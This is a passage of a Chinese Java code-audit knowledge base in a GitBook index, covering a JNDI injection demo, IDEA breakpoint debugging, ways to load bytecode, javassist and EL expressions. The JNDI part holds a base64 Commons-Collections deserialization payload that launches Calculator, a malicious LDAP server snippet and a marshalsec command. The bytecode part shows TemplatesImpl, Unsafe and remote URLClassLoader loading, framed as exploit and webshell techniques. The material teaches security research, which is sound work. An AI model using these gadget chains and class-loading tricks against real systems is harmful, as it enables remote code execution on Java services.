Base64.decode(\"rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABNvcGVuIC1uYSBDYWxjdWxhdG9ydAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=\")); } catch (ParseException exception) { exception.printStackTrace(); } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } Client package org.example; import javax.naming.InitialContext; import javax.naming.NamingException; public class Client { public static void main(String[] args) throws NamingException { //初始化环境 InitialContext init = new InitialContext(); init.lookup(\"ldap://127.0.0.1:1389/Exploit\"); } } Debug分析 调用栈 前面的函数调用链都是不同类lookup()函数之间的调用，com.sun.jndi.ldap.LdapCtx类的c_lookup()函数中会调用到com.sun.jndi.ldap.Obj类的decodeObject()函数进行解码对象的操作。 跟进去，先调用getCodebases()函数从JAVA_ATTRIBUTES中取出索引为4即javaCodeBase的内容，由于本次并没有设置这个属性因此返回null即下面Variables框中的var1(slot_2)变量；然后从JAVA_ATTRIBUTES中取出索引为1即javaSerializedData的内容，这个我们是在恶意LDAP服务端中设置了的、内容就是恶意的Commons-Collections这个Gadget的恶意利用序列化对象字节流，对应的是下面Variables框中的var2 (slot_1)变量；这里var1(slot_2)变量为null，传入getURLClassLoader()函数调用后返回的是AppClassLoader即应用类加载器；再往下就是调用deserializeObject()函数来反序列化javaSerializedData的对象字节码 其中，静态变量JAVA_ATTRIBUTES的内容如下： 建议 实战中可以使用marshalsec方便的启动一个LDAP/RMI Ref Server： java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.(LDAP|RMI)RefServer # [] Example: java -cp target/marshalsec-0.0.1-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://8.8.8.8:8090/#Exploit 8088 参考 关于 JNDI 注入 JNDI注入入门 浅析JNDI注入 who is JNDI？ Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-27 14:45:00 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/06.IDEA断点调试.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/06.IDEA断点调试.html","title":"06.IDEA断点调试","keywords":"","body":" 前言 控制面板 断点 什么是断点 断点参数（断点属性） 断点的种类 Line breakpoint（行断点） Temporary line breakpoint（临时行断点） Field watchpoint（属性断点） Method breakpoint（方法断点） Exception breakpoint（异常断点） 条件断点 前言 代码审计过程中肯定是需要下断点让程序暂停进行分析的，所以很重要！！！ 调试技能重要性甚⾄超过学习⼀门语⾔:hotsprings: 本文主要是针对IDEA进行断点调试，IDEA YYDS 在调试代码的时候，你的项目得debug模式启动，也就是点那个绿色的甲虫启动服务器，然后，就可以在代码里面断点调试啦。 控制面板 参考https://blog.csdn.net/f641385712/article/details/93145454 大多数说明图片就直接Copy过来的，不足点再添加补充说明 进入断点管理界面 说明 断点 什么是断点 断点你可能天天都在使用，但是若真要你对它下定义，估计一时间还有点懵逼呢有木有？ 断点：是一种附加在源代码上面的特殊标记，在调试模式(debug模式)下可以触发特定的动作，比如打印线程调用栈信息、计算值、打印指定表达式的值等等。 Tips：断点一但设置就会一直保存在工程中直到手动删除~ 断点参数（断点属性） 断点并不是仅仅是孤立的存在的，它也可以通过参数进行定制化，这些叫断点参数。 不同类型的断点支持的断点参数也不尽相同，在下面具体介绍时会详细说明~ 断点的种类 据我粗略调查，80%的小伙伴打断点只会采用代码行左边鼠标单击这种最基础的方式打断点然后调试。其实在现实场景中，有非常非常多的情况下，这种方式将很难快速定位到问题所在，因此了解断点分类、调试技巧就显得有点必须了 殊不知，IDEA给我们提供了丰富的断点类型，让我们能够在不同的调试场景下，使用不同的断点类型来大大提高我们的调试效率，毕竟效率就是时间，而时间就是生命。 从idea断点对话框里也能够看出断点是分类的。然后下面我对断点的分类讲解不是完全按此分类，我的分类会更加详细如下： Line breakpoint（行断点）：在指定代码行设置断点，属于行级别的断点 Temporary line breakpoint（临时行断点）：与行断点类似，不同之处在于该类型的断点在被激活之后会被立即删除 Field watchpoint（属性断点）：读取或者修改属性时会激活属性断点 Method breakpoint（方法断点）：它是标记在方法那一行的断点，有自己特有的属性参数 Exception breakpoint（异常断点）：当程序抛出指定异常时会激活异常断点。与行断点不同，异常断点不需要与源代码映射（不需要打在具体某一行代码上），因为异常断点应用程序级别的 Line breakpoint（行断点） 这是使用得最为广泛的一种断点。示例操作“视频“： 断点参数 作为第一个介绍的断点类型，这里有必要全面的解释一下上面行断点操作的断点参数： Suspend：有没有让你诧异到，它竟然是个复选框并且还可以不被选中。若它不被选中的话断点的相关动作依然激活执行，只是线程不会被组塞了而已。它的两种阻塞策略如下： All：阻塞该程序内所有线程（默认） Thread：只阻塞当前断点所在线程（在多线程调试、远程调试中强烈建议使用这种方式） Condition：这就是所谓的条件断点，只有书写的表达式返回true时候断点才会被激活 Log： 勾选\"Breakpoint hit message\"：断点激活时输出提示日志 勾选\"Stack trace\"：断点激活时输出程序调用栈信息 勾选\"Evaluate and log\"：并在下面的输入框中输入\"args\"，断点激活时会计算并输出变量 args 的值 可以同时选中 Temporary line breakpoint（临时行断点） 创建方法不说了，同上。和上面的唯一区别是：把Remove once hit这个复选框给勾选上（此类型断点其实使用较少）。 Field watchpoint（属性断点） 创建的方式和上无差异。（目前发现是针对的类中定义的变量） 断点参数 由于绝大多数参数第一个已经讲述了，so这里只剩一个它独有的参数： Watch：选中\"Filed Access\" 读取的时候都会断住。选中\"Filed madification\"表示修改的时候都会断住 Method breakpoint（方法断点） 打断点方式同上，只是它是必须把断点打在方法那一行上。 它也有一个自己独有的参数： Watch： - “Method entry”：进入方法时激活断点 - “Method exit”：出去方法时激活断点 - “Emulated”：目前发现没啥卵用（求小伙伴不要喷我~） Exception breakpoint（异常断点） 异常断点属于非常特殊的一种断点类型，它不对应任何一行代码，因为它属于程序级别的断点。 它不能像上面在代码处直接创建，只能通过上面的断点对话框来创建。 此处注意：异常断点中很多选项就是不能使用的（灰色）如下图示： 断点参数 但是同理，它也提供一个特有的断点参数： Notification： - “Catch excetion”：程序在捕获（Try Catch）这个异常时激活断点 - “Uncatch excetion”：不catch捕获异常时激活断点 小细节：对于不同类型的断点，打桩后我们看到的图标也是有差异的，如图： 条件断点 就是断点在满足条件的时候才会阻塞，不过一般也只能书写一些较简单的判定 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/07.Java加载字节码.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/07.Java加载字节码.html","title":"07.Java加载字节码","keywords":"","body":" 简介 什么是Java字节码 JAVA程序的运行 字节码如何产生 如何看懂字节码 加载字节码 利用URLClassLoader加载远程class文件 利用ClassLoader#defineClass加载字节码 利用TemplatesImpl加载字节码 利用Unsafe#defineClass加载字节码 利用BCEL ClassLoader加载字节码 参考 简介 什么是Java字节码 它是程序的一种低级表示，可以运行于Java虚拟机上。将程序抽象成字节码可以保证Java程序在各种设备上的运行 Java号称是一门“一次编译到处运行”的语言，从我们写的java文件到通过编译器编译成java字节码文件（.class文件），这个过程是java编译过程；而我们的java虚拟机执行的就是字节码文件。不论该字节码文件来自何方，由哪种编译器编译，甚至是手写字节码文件，只要符合java虚拟机的规范，那么它就能够执行该字节码文件。 JAVA程序的运行 因为Java具有跨平台特性，为了实现这个特性，Java执行在一台虚拟机上，这台虚拟机就是JVM，Java通过JVM屏蔽了不同平台之间的差异，从而做到一次编译到处执行。 JVM位于Java编译器和OS平台之间，Java编译器只需面向JVM，生成JVM能理解的代码，这个代码即字节码，JVM再将字节码翻译成真实机器所能理解的二进制机器码。 字节码如何产生 我们编写的代码文件通常是以.java作为结尾的，可以直接通过javac命令将java文件编译为.class文件，这个.class文件就是字节码文件，也可以直接运行IDE，让其自动为我们编译 如何看懂字节码 可以参考文章：深入理解JVM-读懂java字节码 加载字节码 通常我们是编写好java代码然后ide帮我们自动编译成class字节码文件再加载到jvm中运行的，那如果我们想自己加载class文件，有哪些办法呢？ 后续利用到的演示恶意代码如下 import java.io.IOException; public class Exp { public Exp() throws IOException { Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); } } 编译为字节码 javac Exp.java 利用URLClassLoader加载远程class文件 利用ClassLoader来加载字节码文件是最基础的方法，URLClassLoader继承自ClassLoader且重写了findClass函数，允许远程加载字节码，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用（当然，该方式只适应于目标出网的情况）。 正常情况下，Java会根据配置项 sun.boot.class.path和java.class.path中列举到的基础路径（这些路径是经过处理后的java.net.URL类）来寻找.class文件来加载，而这个基础路径有分为三种情况： URL未以斜杠/结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件（jar文件中直接包含class文件，可以使用命令 jar cvf Exp.jar Exp.class 进行打包）。 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:8000/Exp.jar\")}); // 会加载 http://127.0.0.1:8000/Exp.jar中的Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // 触发构造函数，弹计算器 exp.newInstance(); } } URL以斜杠/结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件。 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"file:/Users/d4m1ts/d4m1ts/java/classloader/\")}); // 会加载 /Users/d4m1ts/d4m1ts/java/classloader/Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // 触发构造函数，弹计算器 exp.newInstance(); } } URL以斜杠/结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类.class文件。 import java.net.MalformedURLException; import java.net.URL; import java.net.URLClassLoader; public class loadClassFile { public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException { URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{new URL(\"http://127.0.0.1:8000/\")}); // 会加载 http://127.0.0.1:8000/Exp.class Class exp = urlClassLoader.loadClass(\"Exp\"); // 触发构造函数，弹计算器 exp.newInstance(); } } 主要关注第三点，利用基础的Loader类来寻找类，而要利用这一点必须是非file协议的情况下 除file协议外，JAVA默认提供了对ftp,gopher,http,https,jar,mailto,netdoc协议的支持 因此作为攻击者，只要我们能够控制目标Java URLClassLoader的基础路径为一个http服务器，则可以利用远程加载的方式执行任意代码了。 利用ClassLoader#defineClass加载字节码 其实java不管是加载远程的class文件，还是本地的class或者jar文件，都是要经历下面三个方法调用的： loadClass: 从已加载的类缓存、父加载器等位置寻找类（双亲委派机制），在前面没有找到的情况下，执行 findClass。 findClass: 根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给 defineClass。 defineClass: 处理前面传入的字节码，将其处理成真正的Java类。 着重关注第三个方法defindClass，由于ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法。 由于ClassLoader#defineClass方法是protected所以我们无法直接从外部进行调用，所以我们这里需要借助反射来调用这个方法 import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; public class loadClassFile { public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp.class\")); // 通过反射调用 defineClass Class clazz = ClassLoader.class; Method defineClass = clazz.getDeclaredMethod(\"defineClass\", String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); Class exp = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(), \"Exp\", classBytes, 0, classBytes.length); // 需要手动实例化触发构造函数 exp.newInstance(); } } 需要注意的是，ClassLoader#defineClass返回的类并不会初始化，只有这个对象显式地调用其构造函数初始化代码才能被执行，所以我们需要想办法调用返回的类的构造函数才能执行命令。 在实际场景中，因为defineClass方法作用域是不开放的，所以攻击者很少能直接利用到它，但它却是我们常用的一个攻击链 TemplatesImpl 的基石。 利用TemplatesImpl加载字节码 在多个Java反序列化利用链，以及fastjson、jackson的漏洞中，都曾出现过 TemplatesImpl 的身影。虽然大部分上层开发者不会直接使用到defineClass方法，同时java.lang.ClassLoader的defineClass方法作用域是不开放的（protected），很难利用，但是Java底层还是有一些类用到了它，譬如TemplatesImpl 在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类中定义了一个内部类：TransletClassLoader 可以看到这个类继承了ClassLoader，而且重写了defineClass方法，并且没有显式地定义方法的作用域。 Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为default。也就是说这里的defineClass由其父类的protected类型变成了一个default类型的方法，可以被同一个包下的类调用。 由于TransletClassLoader是default的可以被同一个包下的类调用，所以由下向上寻找这个defineClass()在TemplatesImpl中的调用链 一直Find Usages，最终找到调用链如下： TemplatesImpl#getOutputProperties() TemplatesImpl#newTransformer() TemplatesImpl#getTransletInstance() TemplatesImpl#defineTransletClasses() TransletClassLoader#defineClass(final byte[] b) 最外层的2个方法均是public修饰的，可以被外部调用，以TemplatesImpl#getOutputProperties()为例。 初次观察整个链，需要设置的参数如下_bytecodes（字节码，不能为null）、_name（不能为null）、_class（需要为null，而默认情况下也为null，所以可以不需要） 但是这样会抛出异常NullPointerException，经过分析，发现还需要设置_tfactory参数，它的类型为TransformerFactoryImpl 所以一共需要设置3个参数，分别是_bytecodes、_name、_tfactory 通过下方实例化的代码，可以看出远程加载的类还必须继承AbstractTranslet类 所以我们的恶意类代码修改如下： import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; public class Exp2 extends AbstractTranslet { public Exp2() throws IOException { Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } 加载字节码代码 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javax.xml.transform.TransformerConfigurationException; import java.io.IOException; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class loadClassFile { public static void main(String[] args) throws IOException, IllegalAccessException, NoSuchFieldException, TransformerConfigurationException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp2.class\")); TemplatesImpl templates = new TemplatesImpl(); Class clazz = templates.getClass(); Field bytecodes = clazz.getDeclaredField(\"_bytecodes\"); Field name = clazz.getDeclaredField(\"_name\"); Field _tfactory = clazz.getDeclaredField(\"_tfactory\"); bytecodes.setAccessible(true); name.setAccessible(true); _tfactory.setAccessible(true); bytecodes.set(templates, new byte[][]{classBytes}); name.set(templates, \"d4m1ts\"); _tfactory.set(templates, new TransformerFactoryImpl()); templates.newTransformer(); } } 利用Unsafe#defineClass加载字节码 Unsafe是位于sun.misc包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，这些方法在提升Java运行效率、增强Java语言底层资源操作能力方面起到了很大的作用。使用该类可以获取到底层的控制权，该类在sun.misc包，默认是BootstrapClassLoader加载的。 而它里面也存在一个defineClass方法，且为public可直接调用 但因为Unsafe的构造方法是private类型的，所以无法通过new方式实例化获取，只能通过它的getUnsafe()方法获取。 又因为Unsafe是直接操作内存的，为了安全起见，Java的开发人员为Unsafe的获取设置了限制，所以想要获取它只能通过Java的反射机制来获取。 因为安全问题，不能直接调用 但前面也说了，我们可以通过反射的方式来调用 通过分析发现，theUnsafe为Unsafe的对象，我们反射拿到这个对象，就可以执行任意方法了 加载字节码代码 import sun.misc.Unsafe; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.nio.file.Files; import java.nio.file.Paths; import java.security.ProtectionDomain; public class loadClassFile { public static void main(String[] args) throws IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException { byte[] classBytes = Files.readAllBytes(Paths.get(\"/Users/d4m1ts/d4m1ts/java/classloader/Exp.class\")); Class unsafeClass = Unsafe.class; Field theUnsafe = unsafeClass.getDeclaredField(\"theUnsafe\"); theUnsafe.setAccessible(true); Unsafe unsafe = (Unsafe) theUnsafe.get(null); Class exp = unsafe.defineClass(\"Exp\", classBytes, 0, classBytes.length, ClassLoader.getSystemClassLoader(), null); exp.newInstance(); } } 利用BCEL ClassLoader加载字节码 BCEL（Byte Code Engineering Library）的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目。它提供了一系列用于分析、创建、修改Java Class文件的API。但其因为被Apache Xalan所使用，而Apache Xalan又是Java内部对于JAXP的实现，所以BCEL也被包含在了JDK的原生库中，位于com.sun.org.apache.bcel 虽然说它包含在原生库吧，但是在jdk8u251后，com.sun.org.apache.bcel.internal.util.ClassLoader就被删除了，如果单独引入了它的依赖，则还有ClassLoader，参考 BCEL ClassLoader去哪了 依赖： org.apache.bcel bcel 5.2 在bcel的包中有一个ClassLoader，他重写了Java内置的ClassLoader#loadClass()方法，在loadclass方法中会对类名进行判断，如果类名以$$BCEL$$开始，就会进入createClass方法， 然后在createClass方法里面，会调用Utility.decode()来解密，最后生成clazz 但如何生成能给它解密的字节码呢？ 通过BCEL提供的两个类Repository和Utility来实现： Repository：用于将一个Class先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； Utility：用于将原生的字节码转换成BCEL格式的字节码； 利用代码 JavaClass javaClass = Repository.lookupClass(Exp.class); String encode = Utility.encode(javaClass.getBytes(), true); System.out.println(encode); new org.apache.bcel.util.ClassLoader().loadClass(\"$$BCEL$$\" + encode).newInstance(); 结果 看着很简单很容易，但是有很多坑 坑点一： jdk8u261，Utility.encode中，GZIPOutputStream流不会close，所以内容写不进ByteArrayOutputStream的（给俺整懵了，网上没找到一个说这个问题的，还是得自己调试才行，离谱） 换了个低版本的jdk8u231，就关闭了流可以写入进行加密，俺也不懂为啥高版本删除了，难道是删除ClassLoader的时候一起删除了？。。。 坑点二： 换了低版本的JDK，但是出现了新的问题，提示不支持的操作 跟了一下，发现在ClassLoader#createClass()方法中有问题 其中在调用setBytes()是提示这个方法调用会失败 跟进一下，发现会直接抛出异常。。。 找了一大圈，没发现有人提到这个问题，后来不经意看到了setBytes的说明，在BCEL 6.0的时候遗弃了。。。 所以需要用低于6.0版本的BCEL，换了个06年的5.2 org.apache.bcel bcel 5.2 方法没被遗弃，然后解决了这个问题 参考 Java安全-Java动态加载字节码方法 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/08.javassist字节码编程.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/08.javassist字节码编程.html","title":"08.javassist字节码编程","keywords":"","body":" 介绍 使用 常用类 依赖 举例 参考 介绍 javassist是一个开源的分析、编辑和创建Java字节码的类库，通过javassist提供的API可以在java程序运行时编辑一个类的字节码信息，改变该类的结构信息。说简单点，就是一个用来处理Java字节码的类库。 除了Javassist，常见的字节码编程工具有ASM和byte-buddy，这两个工具相对来说更加偏向于底层，需要了解关于jvm的指令；使用javassist可以不需要了解jvm指令，只需使用javassist类库提供的API接口就可以实现字节码编程。 使用 常用类 javassist字节码编程常用的类： ClassPool：ClassPool 类可以控制的类的字节码，例如创建一个类或加载一个类，与JVM类装载器类似；它是基于哈希表（Hashtable）实现的CtClass对象容器，其中键名是类名称，值是表示该类的CtClass对象（Hashtable和Hashmap类似都是实现map接口，hashmap可以接收null的值，但是Hashtable不行）。 public static synchronized ClassPool getDefault() // 返回默认的类池对象。 public ClassPath insertClassPath(String pathname) // 在搜索路径的开头插入目录或jar（或zip）文件。 public ClassPath insertClassPath(ClassPath cp) // ClassPath在搜索路径的开头插入一个对象。 public ClassLoader getClassLoader() // 获取类加载器toClass()，getAnnotations()在 CtClass等 public CtClass get(String classname) // 从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用。 public ClassPath appendClassPath(ClassPath cp) // 将ClassPath对象附加到搜索路径的末尾。 public CtClass makeClass(String classname) // 创建一个新的public类 CtClass： CtClass表示编译时的一个类，它提供了类的操作，如在类中动态添加新字段、方法和构造函数、以及改变类、父类和接口的方法 public void setSuperclass(CtClass clazz) // 更改超类，除非此对象表示接口。 public Class toClass(Lookup lookup) // 将此类转换为java.lang.Class对象。 public byte[] toBytecode() // 将该类转换为字节码数组。 public void writeFile() // 将由此CtClass对象表示的类文件写入当前目录。 public void writeFile(String directoryName) // 将由此CtClass 对象表示的类文件写入本地磁盘。 public CtConstructor makeClassInitializer() // 制作一个空的类初始化程序（静态构造函数）。 CtMethod：表示类中的方法，通过它可以给类创建新的方法，还可以修改返回类型，访问修饰符等，甚至还可以修改方法体内容代码 CtField：类的属性，通过它可以给类创建新的属性，还可以修改已有的属性的类型，访问修饰符等 CtConstructor：用于访问类的构造，与CtMethod类的作用类似 public void setBody(String src) // 设置构造函数主体 public void setBody(CtConstructor src, ClassMap map) // 从另一个构造函数复制一个构造函数主体。 public CtMethod toMethod(String name, CtClass declaring, ClassMap map) // 复制此构造函数并将其转换为方法 ClassClassPath：该类作用是用于通过getResourceAsStream()在java.lang.Class中获取类文件的搜索路径。 public ClassClassPath(Class c) // 构造函数，创建一个搜索路径 public URL find(String classname) // 获取指定类文件的URL public InputStream openClassfile(String classname) // 通过getResourceAsStream()获取类 依赖 org.javassist javassist 3.28.0-GA 举例 创建对象Test，并创建public static void main( String[] )方法，最后反射调用 import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.util.Arrays; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //创建classPool类池对象 ClassPool classPool = ClassPool.getDefault(); // 通过classPool创建一个新的类Test CtClass test = classPool.makeClass(\"Test\"); // 创建 void main() 方法，（方法的返回值类型你，方法名，方法的参数类型，方法所属的类） CtMethod mainMethod = new CtMethod(CtClass.voidType, \"main\", new CtClass[]{classPool.get(String[].class.getName())}, test); // 设置main方法的访问修饰符 public static mainMethod.setModifiers(Modifier.PUBLIC + Modifier.STATIC); // 设置方法内容 mainMethod.setBody(\"System.out.println(\\\"test\\\");\"); // 添加方法 test.addMethod(mainMethod); // 写入当前目录，运行后会在当前项目的根目录生成 Test.class 文件 test.writeFile(); // 讲test转换为字节码数组输出 System.out.println(Arrays.toString(test.toBytecode())); // 生成Class对象，反射调用main方法 Class aClass = test.toClass(); Object o = aClass.newInstance(); aClass.getDeclaredMethod(\"main\", String[].class).invoke(o, new String[1]); } } 创建构造函数，和刚才的差不多，微改即可 import javassist.*; import java.io.IOException; import java.lang.reflect.InvocationTargetException; public class Main { public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException { //创建classPool类池对象 ClassPool classPool = ClassPool.getDefault(); // 通过classPool创建一个新的类Test CtClass test = classPool.makeClass(\"Test\"); // 创建构造函数 CtConstructor constructor = new CtConstructor(null, test); // 设置main方法的访问修饰符 public constructor.setModifiers(Modifier.PUBLIC); // 设置方法内容 constructor.setBody(\"System.out.println(\\\"test\\\");\"); // 添加方法 test.addConstructor(constructor); // 写入当前目录，运行后会在当前项目的根目录生成 Test.class 文件 test.writeFile(); // 生成Class对象，然后生成实例 Class aClass = test.toClass(); Object o = aClass.newInstance(); } } 参考 10-java安全基础——javassist字节码编程 Java安全之Javassist动态编程 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/01.审计基础/09.EL表达式.html":{"url":"个人知识库/02.代码审计/01.Java安全/01.审计基础/09.EL表达式.html","title":"09.EL表达式","keywords":"","body":" 介绍 快速搭建tomcat环境 前期准备 环境搭建 EL表达式使用 EL基础语法 [ ]与.运算符 获取变量举例 操作符 隐含对象 函数 禁用/启用EL表达式 EL表达式注入 EL表达式注入绕过 参考 介绍 EL 全名为Expression Language，是为了使JSP写起来更加简单。表达式语言的灵感来自于 ECMAScript 和 XPath 表达式语言，它提供了在 JSP 中简化表达式的方法，让Jsp的代码更加简化。 EL主要作用： 获取数据 EL表达式主要用于替换JSP页面中的脚本表达式，以从各种类型的web域 中检索java对象、获取数据。(某个web域 中的对象，访问javabean的属性、访问list集合、访问map集合、访问数组) 执行运算 利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算。${user==null} 获取web开发常用对象 EL 表达式定义了一些隐式对象，利用这些隐式对象，web开发人员可以很轻松获得对web常用对象的引用，从而获得这些对象中的数据。 调用Java方法 EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法。 快速搭建tomcat环境 因为需要使用到JSP来学习EL表达式，所以想法是快速搭一个tomcat环境，之前采用的是添加tomcat依赖到pom.xml的方法，使用内置tomcat，但是感觉搭建环境速度太慢了，所以学了个新的方法来快速搭建tomcat环境 参考：https://blog.51cto.com/u_15119353/3309943 前期准备 tomcat可用版 IDEA tomcat各版本下载地址：https://archive.apache.org/dist/tomcat/tomcat-8/ 环境搭建 先建一个平平无奇的Java项目 然后右键，选择Add Framework Support... 勾选Web Application 这个时候就会多一个web目录，也就是我们的webapps目录 打开Project Structure窗口，新建2个文件夹在WEB-INF目录下，分别是classes和lib，这一步是为了添加项目类路径 修改编译后的类路径到我们刚才新建的classes目录下 添加本地tomcat服务器 配置好需要的信息，然后Fix修复一下 给应用上下文路径设置为跟路径，如果这里设置为/a 则访问就变成 localhost:8080/a/ 然后启动运行即可 项目结构 EL表达式使用 EL基础语法 在JSP中访问模型对象是通过EL表达式的语法来表达。所有EL表达式的格式都是以${}表示。 